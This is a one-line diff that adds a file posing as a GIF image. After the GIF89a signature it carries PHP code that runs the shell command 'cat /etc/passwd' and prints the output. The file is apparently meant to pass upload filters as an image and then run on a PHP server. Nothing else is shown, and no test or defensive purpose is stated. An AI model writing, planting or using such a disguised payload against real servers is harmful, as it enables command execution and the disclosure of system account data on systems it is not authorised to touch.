@@ -1,0 +1,1 @@
+GIF89a <pre><?php echo system("cat /etc/passwd"); ?></pre>
